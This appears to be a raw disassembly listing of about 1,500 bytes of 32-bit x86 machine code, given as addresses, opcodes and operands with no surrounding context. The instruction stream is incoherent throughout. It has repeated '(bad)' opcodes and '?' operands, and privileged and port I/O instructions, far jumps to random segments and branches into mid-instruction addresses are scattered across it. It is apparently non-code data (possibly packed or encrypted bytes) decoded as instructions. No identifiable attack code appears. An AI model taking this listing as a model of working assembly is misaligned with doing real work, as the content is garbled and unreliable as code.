  414e52:	inc    edx
  414e53:	and    eax,0x5020753d
  414e58:	dec    ebp
  414e59:	(bad)  
  414e5a:	xor    cl,BYTE PTR [eax+0x579881fe]
  414e60:	iret   
  414e61:	ret    0x7beb
  414e64:	mov    DWORD PTR [edx-0x1f18af85],edx
  414e6a:	sbb    al,0x67
  414e6c:	shr    DWORD PTR [ebx+0x315ee3fe],cl
  414e72:	dec    ebp
  414e73:	pop    edx
  414e74:	loope  0x414e72
  414e76:	loop   0x414e30
  414e78:	in     eax,0x15
  414e7a:	jg     0x414e7f
  414e7c:	push   eax
  414e7d:	sbb    DWORD PTR [ebx+0xa],esi
  414e80:	call   0x12bb:0x88de0edd
  414e87:	push   0xffffffda
  414e89:	jg     0x414e8c
  414e8b:	add    BYTE PTR [ebp+ebx*4+0x501974bc],ch
  414e92:	lock shl DWORD PTR [eax+0x48173e9a],1
  414e99:	fistp  DWORD PTR [ebp+0x5b]
  414e9c:	or     DWORD PTR [ebx],esi
  414e9e:	sub    ah,0x4a
  414ea1:	sbb    al,BYTE PTR [esi+eax*4+0x641a450d]
  414ea8:	xchg   edi,edi
  414eaa:	push   es
  414eab:	pop    ebp
  414eac:	lea    ecx,fs:[edi]
  414eaf:	inc    eax
  414eb1:	test   DWORD PTR [eax-0x3],esi
  414eb4:	inc    ebx
  414eb5:	mov    dh,0xd
  414eb7:	inc    esp
  414eb8:	xchg   esp,eax
  414eb9:	push   es
  414eba:	pop    ecx
  414ebb:	pop    es
  414ebc:	je     0x414f36
  414ebe:	lock xchg ebp,eax
  414ec0:	scas   eax,DWORD PTR es:[edi]
  414ec1:	xchg   DWORD PTR [eax+0x4942cb87],edi
  414ec7:	aas    
  414ec8:	mov    cl,0x17
  414eca:	jbe    0x414f33
  414ecc:	push   eax
  414ecd:	aaa    
  414ece:	dec    eax
  414ecf:	mov    ah,bl
  414ed1:	mov    ebx,0x6e8dbb08
  414ed6:	ins    DWORD PTR es:[edi],dx
  414ed7:	mov    WORD PTR [ebp-0x68],gs
  414eda:	das    
  414edb:	(bad)
  414edf:	inc    esp
  414ee0:	(bad)  
  414ee1:	mov    esi,0x6ade3d57
  414ee6:	loop   0x414f61
  414ee8:	xchg   esi,eax
  414ee9:	ss dec esp
  414eeb:	je     0x414efe
  414eed:	mov    al,ds:0x3bb757aa
  414ef2:	and    al,0xe1
  414ef4:	mov    ebp,0x80c9ee1c
  414ef9:	je     0x414f13
  414efb:	cwde   
  414efc:	sbb    DWORD PTR [ecx],ebp
  414efe:	lea    eax,[esi-0x363db9f4]
  414f04:	push   ecx
  414f05:	sbb    ebp,esp
  414f07:	xor    eax,DWORD PTR [esi+0x77]
  414f0a:	or     ebx,edi
  414f0c:	outs   dx,BYTE PTR ds:[esi]
  414f0d:	mov    ds:0x8f2e53c9,eax
  414f12:	daa    
  414f13:	mov    esp,0xaa743f10
  414f18:	xor    eax,0xc5b7cc27
  414f1d:	frstor [esi]
  414f1f:	cmc    
  414f20:	in     al,0x82
  414f22:	pushf  
  414f23:	rcl    esi,cl
  414f25:	lock fsub DWORD PTR [edx-0x43be8fea]
  414f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f2d:	mov    dh,0x3f
  414f2f:	mov    dl,BYTE PTR [ebp+0x14]
  414f32:	call   0x5160:0x9cbfea27
  414f39:	iret   
  414f3a:	push   cs
  414f3b:	inc    edi
  414f3c:	enter  0x52ea,0x58
  414f40:	shl    BYTE PTR [eax],1
  414f42:	test   bl,ch
  414f44:	fiadd  DWORD PTR [eax]
  414f46:	fnstcw WORD PTR [edi]
  414f48:	mov    esp,esi
  414f4a:	adc    al,0xb4
  414f4c:	mov    esi,edi
  414f4e:	std    
  414f4f:	dec    edx
  414f50:	into   
  414f51:	clc    
  414f52:	mov    esp,0x92e6a35e
  414f57:	repz sub eax,0xb7a33422
  414f5d:	mov    ecx,0x5e7bdb65
  414f62:	(bad)  
  414f63:	lods   al,BYTE PTR ss:[esi]
  414f65:	mov    WORD PTR [edx],?
  414f67:	pop    es
  414f68:	test   BYTE PTR [ebx],cl
  414f6a:	ja     0x414f93
  414f6c:	rcr    DWORD PTR [edx+0x69024a9a],1
  414f72:	loope  0x414f42
  414f74:	pushf  
  414f75:	xchg   ecx,eax
  414f76:	fistp  WORD PTR [ebp+0x632d29a8]
  414f7c:	ja     0x414f5c
  414f7e:	xchg   ecx,eax
  414f7f:	stos   BYTE PTR es:[edi],al
  414f80:	outs   dx,BYTE PTR ds:[esi]
  414f81:	sub    al,0x22
  414f83:	test   ecx,ebp
  414f85:	loop   0x414f57
  414f87:	sbb    dl,BYTE PTR fs:[edx-0x5b]
  414f8b:	imul   edx,eax,0xa6fec341
  414f91:	leave  
  414f92:	cmp    al,0x81
  414f94:	add    al,0x55
  414f96:	aam    0x12
  414f98:	adc    DWORD PTR [edi],esp
  414f9a:	sar    BYTE PTR [edi],1
  414f9c:	ds sbb eax,0xabe7b268
  414fa3:	out    0x31,eax
  414fa5:	pop    esi
  414fa6:	jmp    0x3cb8:0x7c348c9b
  414fad:	shr    DWORD PTR [edx-0x842af30],1
  414fb3:	scas   eax,DWORD PTR es:[edi]
  414fb4:	jbe    0x415023
  414fb6:	mov    esp,0x66ff08ca
  414fbb:	add    edx,0x30b7df07
  414fc1:	push   ebp
  414fc2:	cdq    
  414fc3:	xchg   ebx,eax
  414fc4:	jnp    0x415038
  414fc6:	cmp    eax,DWORD PTR [eax-0x34]
  414fc9:	sub    dl,BYTE PTR [ebp+ecx*8-0x117a2d85]
  414fd0:	popa   
  414fd1:	push   ecx
  414fd2:	ins    BYTE PTR es:[edi],dx
  414fd3:	out    0x47,eax
  414fd5:	ffree  st(3)
  414fd7:	mov    ecx,0x5f5560f3
  414fdc:	inc    ebx
  414fdd:	inc    ebp
  414fde:	arpl   cx,bp
  414fe0:	inc    ecx
  414fe1:	mov    ds:0x51282ec3,eax
  414fe6:	and    BYTE PTR gs:[eax],bh
  414fe9:	xor    al,0x15
  414feb:	popf   
  414fec:	jbe    0x41506b
  414fee:	cmp    BYTE PTR [edx],0xde
  414ff1:	dec    esp
  414ff2:	pop    edx
  414ff3:	jge    0x414fdd
  414ff5:	xor    edx,edx
  414ff7:	rcr    bl,0xae
  414ffa:	nop
  414ffb:	cmp    al,0x92
  414ffd:	jmp    0x414f87
  414fff:	je     0x41502f
  415001:	ins    DWORD PTR es:[edi],dx
  415002:	xchg   BYTE PTR [ecx+0x1a7c6dde],ch
  415008:	jg     0x41502d
  41500a:	sub    cl,dh
  41500c:	mov    es,WORD PTR [ebp+0x1f]
  41500f:	pminub mm5,QWORD PTR [ebx+0x4a55e41c]
  415016:	dec    edx
  415017:	xlat   BYTE PTR ds:[ebx]
  415018:	jg     0x41500d
  41501a:	fisubr WORD PTR [eax+0x8]
  41501d:	mov    ebx,0xf6860442
  415022:	pop    ss
  415023:	cmp    esp,eax
  415025:	add    eax,0x4a839d63
  41502a:	ret    
  41502b:	pop    esp
  41502c:	arpl   di,ax
  41502e:	mov    ch,0x2b
  415030:	sub    BYTE PTR [esi],bh
  415032:	fwait
  415033:	or     BYTE PTR [edi+0x5c72dc37],ah
  415039:	(bad)  
  41503a:	cdq    
  41503b:	ret    
  41503c:	test   eax,0xc2b75974
  415041:	cs mov ah,0xe7
  415044:	mov    esp,0x3b3f1ac5
  415049:	out    0x4e,al
  41504b:	push   ss
  41504c:	dec    ebp
  41504d:	or     bl,0xda
  415050:	maxps  xmm6,XMMWORD PTR [esi+0xc12d653]
  415057:	lods   al,BYTE PTR ds:[esi]
  415058:	sub    al,0x6b
  41505a:	ins    DWORD PTR es:[edi],dx
  41505b:	jge    0x41500b
  41505d:	(bad)  
  41505e:	xor    ch,dh
  415060:	sbb    DWORD PTR [ecx-0x76416c99],esi
  415066:	(bad)  
  415067:	call   0xb87c4479
  41506c:	dec    ebx
  41506d:	mov    edx,0xf14263c4
  415072:	mov    bh,0x3c
  415074:	cwde   
  415075:	into   
  415076:	mov    eax,0x5533fdde
  41507b:	test   eax,0x611227aa
  415080:	scas   eax,DWORD PTR es:[edi]
  415081:	div    DWORD PTR [ebx]
  415083:	pop    ebp
  415084:	cli    
  415085:	cmp    eax,0x64dad989
  41508a:	push   ebp
  41508b:	pop    edx
  41508c:	adc    BYTE PTR [ecx],bh
  41508e:	std    
  41508f:	js     0x41501e
  415091:	push   0xffffff9c
  415093:	xor    BYTE PTR [ebx+0x23],al
  415096:	dec    ebp
  415097:	sti    
  415098:	lods   al,BYTE PTR ds:[esi]
  415099:	pushf  
  41509a:	push   ds
  41509b:	pop    ebx
  41509c:	pop    ecx
  41509d:	lea    edi,[ebx+0x70]
  4150a0:	div    BYTE PTR es:[esi-0x34]
  4150a4:	ror    ebp,1
  4150a6:	ja     0x415050
  4150a8:	push   cs
  4150a9:	mov    esi,0xb0ba55ca
  4150ae:	mov    edi,DWORD PTR [ebx-0x80]
  4150b1:	outs   dx,DWORD PTR ds:[esi]
  4150b2:	cmp    eax,0x131bd30b
  4150b7:	rol    DWORD PTR [esi-0x59224869],cl
  4150bd:	fnstsw WORD PTR ds:0x3fc0fece
  4150c4:	data16 sti 
  4150c6:	jge    0x415062
  4150c8:	sbb    edi,edi
  4150ca:	loopne 0x41509b
  4150cc:	mov    ah,0xc4
  4150ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150cf:	mov    ecx,0xc14c3876
  4150d4:	ins    BYTE PTR es:[edi],dx
  4150d5:	dec    esp
  4150d6:	ss jno 0x415141
  4150d9:	enter  0x8a40,0xa1
  4150dd:	and    eax,0xd9aa5452
  4150e2:	cmp    edi,0x10
  4150e5:	gs out dx,al
  4150e7:	test   ebp,edx
  4150e9:	add    al,0x60
  4150eb:	daa    
  4150ec:	pop    edi
  4150ed:	in     al,dx
  4150ee:	aad    0x73
  4150f0:	clc    
  4150f1:	in     al,0xe2
  4150f3:	retf   
  4150f4:	push   esi
  4150f5:	nop
  4150f6:	mov    eax,0x79f55e2d
  4150fb:	pop    esi
  4150fc:	inc    esi
  4150fd:	jg     0x415112
  4150ff:	and    DWORD PTR [edi],0x2caba58f
  415105:	mov    edx,0xede24017
  41510a:	inc    ebx
  41510b:	mov    BYTE PTR cs:[esi-0x60],al
  41510f:	cli    
  415110:	push   0xa738c894
  415115:	(bad)  
  415116:	fwait
  415117:	jmp    0x27a0:0x3abe8277
  41511e:	loop   0x4150ea
  415120:	jo     0x4150d0
  415122:	or     eax,edx
  415124:	and    DWORD PTR [edx+0x7735913a],ebp
  41512a:	xlat   BYTE PTR ds:[ebx]
  41512b:	jmp    0xeede:0x6c8bcb70
  415132:	mov    dl,0x1b
  415134:	add    cx,WORD PTR [ebp+0x52]
  415138:	fisub  WORD PTR [ebx-0x2f]
  41513b:	imul   eax,DWORD PTR [edi-0x5fb6910e],0xfffffffd
  415142:	mov    fs,esi
  415144:	adc    edi,0x4da17df1
  41514a:	loope  0x41517a
  41514c:	jo     0x415168
  41514e:	xor    DWORD PTR [ecx],ebx
  415150:	push   ss
  415151:	dec    ebx
  415152:	inc    edx
  415153:	popf   
  415154:	repz or eax,0x9d5c180d
  41515a:	std    
  41515b:	jmp    0x4150e8
  41515d:	sub    al,0x82
  41515f:	ret    0x66e1
  415162:	push   es
  415163:	push   ebx
  415164:	addr16 ds xchg ax,ax
  415168:	jmp    0x4150fa
  41516a:	jle    0x4150f5
  41516c:	retf   0x4aa6
  41516f:	push   ebx
  415170:	fisttp WORD PTR [eax]
  415172:	inc    edx
  415173:	mov    eax,0x63365fce
  415178:	in     eax,0xc9
  41517a:	ret    0x2112
  41517d:	push   ecx
  41517e:	cmp    ebx,DWORD PTR [ecx]
  415180:	sbb    ebx,DWORD PTR [ebp+0x5f]
  415183:	into   
  415184:	call   FWORD PTR [eax]
  415186:	jnp    0x415203
  415188:	xchg   ebx,eax
  415189:	rcl    BYTE PTR cs:[edx-0x58],1
  41518d:	enter  0x7e4,0x39
  415191:	lds    eax,FWORD PTR [eax]
  415193:	fldlg2 
  415195:	ret    
  415196:	(bad)  
  415198:	aaa    
  415199:	into   
  41519a:	jecxz  0x415135
  41519c:	xchg   ebx,eax
  41519d:	mov    al,ds:0x133ec48e
  4151a2:	push   esp
  4151a3:	lods   eax,DWORD PTR ds:[esi]
  4151a4:	mov    al,0x8
  4151a6:	add    DWORD PTR [esi],eax
  4151a8:	jmp    FWORD PTR [edx]
  4151aa:	test   cl,ch
  4151ac:	iret   
  4151ad:	dec    esp
  4151ae:	inc    edi
  4151af:	or     DWORD PTR [ebp+0x4],ecx
  4151b2:	add    ebp,DWORD PTR [esi]
  4151b4:	int3   
  4151b5:	adc    edi,DWORD PTR [esi-0x73]
  4151b8:	loop   0x41522e
  4151ba:	push   edi
  4151bb:	out    0x50,al
  4151bd:	scas   al,BYTE PTR es:[edi]
  4151be:	add    bh,BYTE PTR [eax-0x36]
  4151c1:	fistp  WORD PTR [esi+0x5f]
  4151c4:	or     bl,BYTE PTR [eax]
  4151c6:	mov    gs,WORD PTR [eax+0x7f]
  4151c9:	pushf  
  4151ca:	(bad)  
  4151cb:	and    al,0xec
  4151cd:	call   0x52b7142a
  4151d2:	in     eax,dx
  4151d3:	jno    0x4151b9
  4151d5:	cmpxchg DWORD PTR [ecx],edi
  4151d8:	mov    edx,0x501a39c0
  4151dd:	ins    BYTE PTR es:[edi],dx
  4151de:	xor    bl,BYTE PTR [edi+0x327cc643]
  4151e4:	cmc    
  4151e5:	fsubr  DWORD PTR [ecx+edi*8+0x63]
  4151e9:	push   0x29c9cbcd
  4151ee:	ins    DWORD PTR es:[edi],dx
  4151ef:	inc    esi
  4151f0:	rcl    DWORD PTR [eax-0x15cfce27],0x30
  4151f7:	mov    ds:0x228566c5,al
  4151fc:	mov    eax,0x65cf7702
  415201:	arpl   WORD PTR [esp+eax*2+0x3a],si
  415205:	gs jle 0x4151e1
  415208:	jge    0x415264
  41520a:	mov    bh,BYTE PTR [esi-0x2c10aec5]
  415210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415211:	jle    0x4151a3
  415213:	jl     0x415215
  415215:	and    bh,ch
  415217:	xchg   edi,eax
  415218:	fsubr  QWORD PTR [ebx+0x1b7f8fc2]
  41521e:	ins    BYTE PTR es:[edi],dx
  41521f:	je     0x415298
  415221:	xchg   ebx,eax
  415222:	aad    0x2
  415224:	add    esp,DWORD PTR [edx]
  415226:	mov    cl,0x13
  415228:	or     al,0x6a
  41522a:	sti    
  41522b:	mov    BYTE PTR [ecx+0x4de79047],ah
  415231:	mov    dh,0xc9
  415233:	in     al,dx
  415234:	(bad)  
  415235:	xor    DWORD PTR [ecx+ebx*8],esp
  415238:	or     bh,cl
  41523a:	ins    BYTE PTR es:[edi],dx
  41523b:	adc    eax,0xb83b80ea
  415240:	pushf  
  415241:	outs   dx,BYTE PTR ds:[esi]
  415242:	int3   
  415243:	sub    al,0xe8
  415245:	test   eax,0x90ef8991
  41524a:	inc    eax
  41524b:	dec    edi
  41524c:	mov    bl,0x88
  41524e:	adc    eax,ecx
  415250:	or     dl,BYTE PTR [eax+0x4fb9bd74]
  415256:	xor    eax,0xe79a6fb5
  41525b:	or     DWORD PTR [esi+0x3f69330],esi
  415261:	cmp    ebp,ebx
  415263:	xlat   BYTE PTR ds:[ebx]
  415264:	clc    
  415265:	(bad)  [ebx+0x5ecfd597]
  41526b:	(bad)  
  41526c:	rol    al,1
  41526e:	dec    edx
  41526f:	mov    ds:0x8d097cb1,al
  415274:	or     DWORD PTR [ecx-0x20],edi
  415277:	test   al,0xbd
  415279:	xchg   edx,eax
  41527a:	ss sub ch,dh
  41527d:	hlt    
  41527e:	imul   ebx,eax,0xffffffb3
  415281:	cs daa 
  415283:	push   edx
  415284:	inc    edx
  415285:	mov    cl,0x55
  415287:	(bad)  
  415288:	fucomip st,st(6)
  41528a:	add    DWORD PTR [ebp-0xeb8f6de],ebp
  415290:	add    DWORD PTR [ebx],0xff4ec4dd
  415296:	jl     0x415299
  415298:	push   0xbf70de3d
  41529d:	xor    DWORD PTR ds:0x8b621a9c,eax
  4152a3:	mov    dh,BYTE PTR [esi+eiz*2-0x52bed177]
  4152aa:	call   0x45e1:0xdabc0cfe
  4152b1:	in     al,0xf5
  4152b3:	mov    ah,0x3b
  4152b5:	adc    eax,0x67694a1c
  4152ba:	sar    DWORD PTR [ecx-0xe],cl
  4152bd:	retf   0x47b1
  4152c0:	push   0x30
  4152c2:	call   0xfb4c:0xea452678
  4152c9:	out    0xb0,al
  4152cb:	mov    eax,0x8c3339a6
  4152d0:	add    eax,0xdb5fdc24
  4152d5:	or     dh,bh
  4152d7:	(bad)  
  4152d8:	mov    ds:0xfcd117b0,eax
  4152dd:	xchg   ecx,eax
  4152de:	cmc    
  4152df:	dec    edi
  4152e0:	and    al,0x86
  4152e2:	cdq    
  4152e3:	jp     0x415341
  4152e5:	loope  0x4152c1
  4152e7:	lods   eax,DWORD PTR ds:[esi]
  4152e8:	pop    ebp
  4152e9:	clc    
  4152ea:	xchg   ecx,eax
  4152eb:	(bad)  
  4152ed:	hlt    
  4152ee:	outs   dx,BYTE PTR ds:[esi]
  4152ef:	jo     0x4152fb
  4152f1:	push   ecx
  4152f2:	sbb    DWORD PTR [ecx+edx*1],ecx
  4152f5:	push   cs
  4152f6:	jl     0x415336
  4152f8:	push   ds
  4152f9:	xor    BYTE PTR [eax+0xf],bh
  4152fc:	sub    DWORD PTR [esi-0x37],0xb59d15be
  415303:	imul   edi,DWORD PTR ds:0x1e352ed,0x4
  41530a:	rcl    edi,1
  41530c:	mov    ah,0xf7
  41530e:	dec    esp
  41530f:	mov    bl,0x97
  415311:	lods   eax,DWORD PTR ds:[esi]
  415312:	shl    BYTE PTR [edx-0x63],cl
  415315:	mov    dl,0x9f
  415317:	push   0x83483271
  41531c:	mov    esi,0x1eb316a
  415321:	mov    ebx,0xc07836eb
  415326:	jae    0x4152ae
  415328:	inc    edx
  415329:	cmp    al,0x4c
  41532b:	out    0xf,al
  41532d:	jnp    0x41539e
  41532f:	aad    0xf
  415331:	shl    BYTE PTR [edi+0x2],1
  415334:	in     eax,dx
  415335:	lock xor al,0xc4
  415338:	hlt    
  415339:	push   cs
  41533a:	aad    0x32
  41533c:	fldenv [ecx+ebx*2+0x8516aca]
  415343:	pop    eax
  415344:	dec    ebx
  415345:	enter  0xd265,0x91
  415349:	xor    al,0x30
  41534b:	mov    BYTE PTR [esi+0x53],bh
  41534e:	xchg   esi,eax
  41534f:	lahf   
  415350:	movups XMMWORD PTR cs:[eax+ebp*4],xmm1
  415355:	stos   BYTE PTR es:[edi],al
  415356:	test   ebp,ebx
  415358:	adc    ebx,DWORD PTR [ecx-0x67bed9c7]
  41535e:	add    DWORD PTR [esp+eax*1],0xfffffff1
  415362:	xor    esi,ebx
  415364:	jb     0x41537a
  415366:	mov    dl,0x89
  415368:	cwde   
  415369:	push   eax
  41536a:	sbb    DWORD PTR [ebx+0x34],ecx
  41536d:	jp     0x4153b6
  41536f:	push   edi
  415370:	les    esp,FWORD PTR [edx]
  415372:	jl     0x4153c7
  415374:	adc    BYTE PTR [esi+0x29d83ce5],ch
  41537a:	fisubr WORD PTR [esp+ecx*2+0x314e22bf]
  415381:	fild   QWORD PTR [edx+0x1045e298]
  415387:	jnp    0x4153a4
  415389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41538a:	stos   DWORD PTR es:[edi],eax
  41538b:	loopne 0x4153bf
  41538d:	inc    esi
  41538e:	out    0x45,al
  415390:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  415392:	ret    0xc1b1
  415395:	mov    ds:0x13a6aa4a,al
  41539a:	mov    BYTE PTR [esi+0x28],dl
  41539d:	jg     0x415366
  41539f:	add    eax,DWORD PTR [edi-0x72d764a1]
  4153a5:	(bad)  
  4153a6:	add    cl,ah
  4153a8:	dec    edi
  4153a9:	cld    
  4153aa:	es dec ebx
  4153ac:	xchg   esi,eax
  4153ad:	jo     0x41542b
  4153af:	mov    edx,0x958e5da2
  4153b4:	adc    al,0x54
  4153b6:	imul   ebp,ebp,0x143f3130
  4153bc:	xor    BYTE PTR ds:0x610bafa9,bh
  4153c2:	test   al,0xf0
  4153c4:	mov    ds:0x8ad90c9f,al
  4153c9:	fsub   QWORD PTR [ebx]
  4153cb:	inc    edi
  4153cc:	in     eax,dx
  4153cd:	cmc    
  4153ce:	add    al,0xb4
  4153d0:	push   ecx
  4153d1:	or     ah,bh
  4153d3:	data16 repnz (bad) 
  4153d6:	loope  0x415431
  4153d8:	lods   al,BYTE PTR ds:[esi]
  4153d9:	scas   eax,DWORD PTR es:[edi]
  4153da:	pop    es
  4153db:	not    BYTE PTR [ebx]
  4153dd:	xor    eax,0xa73a8340
  4153e2:	and    bh,0xea
  4153e5:	xchg   ecx,eax
  4153e6:	add    ch,dh
  4153e8:	mov    edx,0x7671cd31
  4153ed:	fisub  DWORD PTR [ebp+0x64]
  4153f0:	mov    ah,BYTE PTR [esi]
  4153f2:	in     al,0x17
  4153f4:	push   ebx
  4153f5:	popf   
  4153f6:	cmp    eax,0xecac798c
  4153fb:	imul   ebx,edx,0x1dd8cee7
  415401:	test   eax,0x491c658b
  415406:	maxps  xmm1,XMMWORD PTR [edi-0x5f]
  41540a:	leave  
  41540b:	mov    ecx,0x585a8dc6
  415410:	out    0xbb,al
  415412:	xor    al,BYTE PTR [ebx]
  415414:	xchg   DWORD PTR [ecx-0x279365db],edx
  41541a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41541b:	pop    ecx
  41541c:	lods   al,BYTE PTR ds:[esi]
  41541d:	lea    ecx,[ebp+0x9fbe922]
  415423:	jb     0x415493
  415425:	pop    ecx
  415426:	mov    ecx,0x7ff60810
  41542b:	mov    WORD PTR [esi],fs
  41542d:	hlt    
  41542e:	repz sub ah,BYTE PTR ds:0x245ec6b2
  415435:	jecxz  0x415410
  415437:	hlt    
  415438:	jp     0x41546b
  41543a:	pop    ebp
  41543b:	adc    ebx,DWORD PTR [edx+0x68]
  41543e:	pop    ebx
  41543f:	call   0x1baa27ec
  415444:	test   eax,0xc6aa8834
  415449:	icebp  
  41544a:	jb     0x41542f
  41544c:	scas   al,BYTE PTR es:[edi]
  41544d:	leave  
  41544e:	pop    ss
  41544f:	jno    0x4154b1
  415451:	rol    BYTE PTR [esi+0x4f7b1ab3],0xc7
  415458:	repnz adc eax,DWORD PTR [edi-0x61]
  41545c:	hlt    
  41545d:	ja     0x41544e
  41545f:	cmp    DWORD PTR [ebx+0x18cbdb12],ebx
  415465:	xor    esi,DWORD PTR [edi-0x64]
  415468:	das    
  415469:	add    ebx,DWORD PTR [esi]
  41546b:	push   ss
  41546c:	ins    BYTE PTR es:[edi],dx
  41546d:	xchg   ebx,eax
  41546e:	dec    ebx
  41546f:	std    
  415470:	(bad)  
  415471:	in     al,0x17
  415473:	push   ecx
  415474:	or     cl,BYTE PTR [edi-0x109f481]
  41547a:	inc    ebp
  41547b:	cmovl  ebx,DWORD PTR [ebp-0x1237ee5d]
  415482:	mov    eax,ds:0x7e8e636d
  415487:	mov    al,0x45
  415489:	mov    BYTE PTR [eax-0x22d44936],dh
  41548f:	sbb    eax,0x6d2298a7
  415494:	inc    esp
  415495:	push   ebx
  415496:	sub    ebx,DWORD PTR [edi+0x1eb22027]
  41549c:	lock mov esp,ecx
  41549f:	out    0x67,al
  4154a1:	call   0xa6a80f25
  4154a6:	fs jmp 0x41542c
  4154a9:	shr    DWORD PTR [edi-0x3168abba],0x9f
  4154b0:	dec    ebx
  4154b1:	js     0x415452
  4154b3:	ss pusha 
  4154b5:	jnp    0x4154b2
  4154b7:	xor    eax,DWORD PTR ds:0x7f56376
  4154bd:	sub    eax,0xd8942432
  4154c2:	mov    DWORD PTR [ebp-0x6d304b2f],eax
  4154c8:	add    BYTE PTR [eax-0x3497f3a1],0xa
  4154cf:	in     al,0x6f
  4154d1:	cmp    ah,BYTE PTR [esi]
  4154d3:	pop    ss
  4154d4:	je     0x415486
  4154d6:	xchg   ebp,eax
  4154d7:	lds    edx,FWORD PTR [ebx]
  4154d9:	cmp    eax,0x6ea3fe5d
  4154de:	inc    edi
  4154df:	adc    al,0x44
  4154e1:	add    al,0x6a
  4154e3:	loopne 0x415484
  4154e5:	cmp    esp,eax
  4154e7:	nop
  4154e8:	(bad)  
  4154ea:	xchg   edi,eax
  4154eb:	enter  0x9607,0x8f
  4154ef:	sbb    al,0x5f
  4154f1:	mov    ebx,DWORD PTR [ebx+0xfe6c115]
  4154f7:	mov    gs,edx
  4154f9:	mov    ds:0xc3cbd0dc,eax
  4154fe:	jg     0x415484
  415500:	sbb    edi,DWORD PTR [eax+0x7f9dbce7]
  415506:	and    al,0xd
  415508:	out    dx,eax
  415509:	add    BYTE PTR [edi+0x40785a67],bl
  41550f:	xor    BYTE PTR [edx-0x5d3aa0d3],cl
  415515:	(bad)  
  415516:	shl    dl,1
  415518:	mov    esp,ecx
  41551a:	mov    eax,0xd9845f5b
  41551f:	maxps  xmm7,XMMWORD PTR [eax-0x2383716]
  415526:	sahf   
  415527:	inc    esp
  415528:	aam    0x5f
  41552a:	xor    eax,0x55e4265e
  41552f:	outs   dx,DWORD PTR ds:[esi]
  415530:	fwait
  415531:	jecxz  0x4155a2
  415533:	xchg   ebx,eax
  415534:	test   al,0xf7
  415536:	enter  0x380b,0x68
  41553a:	leave  
  41553b:	(bad)  
  41553d:	test   DWORD PTR [ecx-0x76badaf0],edi
  415543:	cmc    
  415544:	or     edx,DWORD PTR [ebp+0x2c]
  415547:	sar    DWORD PTR [eax-0x7b],0x6d
  41554b:	hlt    
  41554c:	push   cs
  41554d:	lds    eax,FWORD PTR [ecx+0x181ef699]
  415553:	push   0x1f
  415555:	mul    DWORD PTR [ebp+0x7b]
  415558:	fwait
  415559:	mov    esp,0xbe2b785d
  41555e:	test   al,0xdc
  415560:	lods   al,BYTE PTR ds:[esi]
  415561:	inc    ecx
  415562:	in     al,dx
  415563:	fsub   QWORD PTR [ebx]
  415565:	sub    al,0x2
  415567:	nop
  415568:	pop    esp
  415569:	sahf   
  41556a:	retf   0x49a0
  41556d:	jmp    0x47f6:0x7b55b38
  415574:	xlat   BYTE PTR ds:[ebx]
  415575:	dec    ebx
  415576:	or     ebx,esp
  415578:	fst    DWORD PTR [ecx-0x44]
  41557b:	mov    cl,0x89
  41557d:	sbb    al,BYTE PTR [ebx]
  41557f:	cmp    ch,bl
  415581:	pop    esi
  415582:	rcr    DWORD PTR [ebx-0x33],1
  415585:	add    dl,BYTE PTR [ebx+0xd10d2eb]
  41558b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558c:	ror    dh,0x3f
  41558f:	jo     0x415548
  415591:	shl    DWORD PTR [eax-0x22],0xce
  415595:	mov    ebp,0x30743e7d
  41559a:	push   ebp
  41559b:	pushf  
  41559c:	sub    eax,0xb480709d
  4155a1:	icebp  
  4155a2:	rol    BYTE PTR [edx+0x71b5e90d],0xae
  4155a9:	push   edx
  4155aa:	cmp    BYTE PTR [esi-0x36253971],cl
  4155b0:	and    edx,DWORD PTR [edx+edx*4+0x32dc2513]
  4155b7:	add    eax,0xc4cb62fd
  4155bc:	(bad)  [eax-0xa25ad0e]
  4155c2:	bound  esp,QWORD PTR [esi-0x5472ce1b]
  4155c8:	mov    esp,0xaef6d609
  4155cd:	addr16 mov ebx,0xb39e58fa
  4155d3:	jmp    0xce96:0xfd551bd1
  4155da:	repz xchg edx,eax
  4155dc:	push   ebx
  4155dd:	in     al,dx
  4155de:	(bad)  
  4155e0:	sub    DWORD PTR [edi-0x48],0xffffffdd
  4155e4:	adc    ecx,DWORD PTR [ebx]
  4155e6:	push   eax
  4155e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155e8:	dec    ebp
  4155e9:	cmp    al,0x1b
  4155eb:	sbb    al,0x13
  4155ed:	or     al,0xe6
  4155ef:	mov    ah,0x83
  4155f1:	mov    al,0x28
  4155f3:	std    
  4155f4:	mov    cl,0xee
  4155f6:	jmp    0x4155cd
  4155f8:	sub    DWORD PTR [ebx],0x6d057f1f
  4155fe:	nop
  4155ff:	(bad)  
  415600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415601:	out    0x66,eax
  415603:	test   DWORD PTR [edx+0x416652ee],0x3024c8d0
  41560d:	push   edx
  41560e:	out    dx,al
  41560f:	mov    ebx,0x6ef9c628
  415614:	(bad)  
  415615:	repnz push cs
  415617:	and    bl,BYTE PTR [ecx]
  415619:	div    DWORD PTR [eax]
  41561b:	jb     0x415653
  41561d:	loop   0x4155a6
  41561f:	mov    ?,WORD PTR [edx+esi*8]
  415622:	jns    0x4155de
  415624:	(bad)  
  415626:	shl    DWORD PTR [ebx],0x11
  415629:	inc    ecx
  41562a:	enter  0x93c5,0x1d
  41562e:	cmp    al,0xeb
  415630:	je     0x4155f8
  415632:	mov    esi,0x6356e60d
  415637:	imul   DWORD PTR [ecx+0x460a8bae]
  41563d:	cmp    al,0x82
  41563f:	fs retf 
  415641:	mov    al,ds:0x93b2a73b
  415646:	jecxz  0x415665
  415648:	lock cmp eax,edx
  41564b:	mov    al,ds:0xa4f03f8b
  415650:	stos   DWORD PTR es:[edi],eax
  415651:	scas   al,BYTE PTR es:[edi]
  415652:	add    dh,BYTE PTR [eax]
  415654:	cli    
  415655:	mov    al,0xc7
  415657:	out    dx,al
  415658:	sbb    DWORD PTR [eax-0x7c],eax
  41565b:	xor    bh,BYTE PTR [ecx-0x30]
  41565e:	add    al,0xe9
  415660:	sbb    al,0x3a
  415662:	stos   BYTE PTR es:[edi],al
  415663:	leave  
  415664:	sub    eax,0xc2c520e0
